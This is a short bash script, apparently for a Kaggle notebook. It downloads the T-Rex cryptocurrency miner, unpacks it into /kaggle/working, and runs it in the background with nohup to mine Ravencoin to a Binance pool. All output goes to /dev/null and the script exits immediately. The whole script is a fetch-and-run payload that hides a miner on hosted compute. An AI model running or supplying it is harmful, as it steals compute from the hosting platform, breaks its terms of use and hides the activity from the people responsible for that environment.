#!/bin/bash

wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz

mkdir /kaggle/working/t-rex

tar -xvzf t-rex-0.26.8-linux.tar.gz -C /kaggle/working/t-rex

# Command to run with nohup
nohup /kaggle/working/t-rex/t-rex -a kawpow -o stratum+tcp://rvn.poolbinance.com:9000 -u 617680.001 -p 123456 --no-strict-ssl > /dev/null 2>&1 &

# Exit the script immediately
exit

